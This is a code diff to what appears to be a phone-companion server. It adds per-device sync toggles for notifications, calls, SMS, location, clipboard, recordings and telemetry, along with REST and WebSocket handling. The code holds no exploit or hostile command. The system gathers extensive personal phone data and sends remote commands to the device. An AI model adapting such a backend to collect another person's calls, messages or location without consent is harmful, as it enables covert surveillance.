@@ -40,7 +40,7 @@ await db.read();
 // from before a field was added keeps its old shape forever otherwise, and
 // every route touching the missing key throws. Backfill anything missing.
 const ARRAY_KEYS = ['devices', 'calls', 'messages', 'locations', 'notifications', 'contacts', 'clipboardHistory', 'commandQueue'];
-const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd'];
+const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd', 'syncConfig'];
 for (const key of ARRAY_KEYS) {
   if (!Array.isArray(db.data[key])) db.data[key] = [];
 }
@@ -166,7 +166,8 @@ const COMMAND_EVENTS = {
   'motion-alarm-config': 'MOTION_ALARM_CONFIG_COMMAND',
   'walkie-talkie-start': 'WALKIE_TALKIE_START',
   'walkie-talkie-chunk': 'WALKIE_TALKIE_CHUNK',
-  'walkie-talkie-stop': 'WALKIE_TALKIE_STOP'
+  'walkie-talkie-stop': 'WALKIE_TALKIE_STOP',
+  'sync-config': 'SYNC_CONFIG_COMMAND'
 };
 
 /** Builds the phone payload for a REST command (1:1 mapping for most). */
@@ -243,6 +244,16 @@ function commandPayload(name, body = {}) {
     case 'walkie-talkie-start': return {};
     case 'walkie-talkie-chunk': return { data: body.data || '' };
     case 'walkie-talkie-stop': return {};
+    case 'sync-config': return {
+      notifications: body.notifications,
+      calls: body.calls,
+      sms: body.sms,
+      location: body.location,
+      clipboard: body.clipboard,
+      recordings: body.recordings,
+      telemetry: body.telemetry,
+      lowDataMode: body.lowDataMode
+    };
     default: return {};
   }
 }
@@ -397,6 +408,19 @@ function handleMessage(ws, msg) {
       persistDevice(device);
       ws.send(JSON.stringify({ event: 'DEVICE_REGISTERED', payload: { deviceId } }));
       broadcastToDashboard('DEVICE_UPDATE', device);
+
+      // Re-apply stored syncConfig preferences to the phone if set, or record phone defaults
+      if (db.data.syncConfig?.[deviceId]) {
+        sendToDevice(deviceId, 'SYNC_CONFIG_COMMAND', db.data.syncConfig[deviceId]);
+      } else if (payload.syncConfig) {
+        if (!db.data.syncConfig) db.data.syncConfig = {};
+        db.data.syncConfig[deviceId] = payload.syncConfig;
+        db.write();
+      }
+      if (db.data.syncConfig?.[deviceId]) {
+        broadcastToDashboard('SYNC_CONFIG_STATUS', { deviceId, ...db.data.syncConfig[deviceId] });
+      }
+
       replayQueue(deviceId);
       console.log(`[device] registered ${deviceId} (${device.deviceName}) @${battery}%`);
       break;
@@ -679,6 +703,17 @@ function handleMessage(ws, msg) {
       broadcastToDashboard(msg.event, payload);
       break;
 
+    case 'SYNC_CONFIG_STATUS': {
+      const { deviceId } = payload;
+      if (deviceId) {
+        if (!db.data.syncConfig) db.data.syncConfig = {};
+        db.data.syncConfig[deviceId] = payload;
+        db.write();
+      }
+      broadcastToDashboard('SYNC_CONFIG_STATUS', payload);
+      break;
+    }
+
     case 'LOCATION_BATCH_UPDATE': {
       const fixes = Array.isArray(payload.waypoints) ? payload.waypoints : (Array.isArray(payload.fixes) ? payload.fixes : (Array.isArray(payload) ? payload : []));
       for (const fix of fixes) {
@@ -858,6 +893,22 @@ app.get('/api/devices/:id/dnd', (req, res) => {
   res.json((db.data.dnd && db.data.dnd[req.params.id]) || null);
 });
 
+app.get('/api/devices/:id/sync-config', (req, res) => {
+  res.json(
+    (db.data.syncConfig && db.data.syncConfig[req.params.id]) || {
+      deviceId: req.params.id,
+      notifications: true,
+      calls: true,
+      sms: true,
+      location: true,
+      clipboard: true,
+      recordings: true,
+      telemetry: true,
+      lowDataMode: false
+    }
+  );
+});
+
 // BUG 5: remove a device (e.g. stale duplicates from BUG 1) + its history.
 app.delete('/api/devices/:id', async (req, res) => {
   const id = req.params.id;
@@ -902,6 +953,24 @@ app.post('/api/command/:name', async (req, res) => {
     await db.write();
     console.log(`[command] queued offline command ${req.params.name} for ${deviceId}`);
     return res.json({ success: true, queued: true });
+  }
+
+  if (req.params.name === 'sync-config') {
+    if (!db.data.syncConfig) db.data.syncConfig = {};
+    const existing = db.data.syncConfig[deviceId] || {};
+    db.data.syncConfig[deviceId] = {
+      deviceId,
+      notifications: req.body.notifications !== undefined ? Boolean(req.body.notifications) : (existing.notifications !== false),
+      calls: req.body.calls !== undefined ? Boolean(req.body.calls) : (existing.calls !== false),
+      sms: req.body.sms !== undefined ? Boolean(req.body.sms) : (existing.sms !== false),
+      location: req.body.location !== undefined ? Boolean(req.body.location) : (existing.location !== false),
+      clipboard: req.body.clipboard !== undefined ? Boolean(req.body.clipboard) : (existing.clipboard !== false),
+      recordings: req.body.recordings !== undefined ? Boolean(req.body.recordings) : (existing.recordings !== false),
+      telemetry: req.body.telemetry !== undefined ? Boolean(req.body.telemetry) : (existing.telemetry !== false),
+      lowDataMode: req.body.lowDataMode !== undefined ? Boolean(req.body.lowDataMode) : Boolean(existing.lowDataMode)
+    };
+    await db.write();
+    broadcastToDashboard('SYNC_CONFIG_STATUS', db.data.syncConfig[deviceId]);
   }
 
   sendToDevice(deviceId, event, commandPayload(req.params.name, req.body));
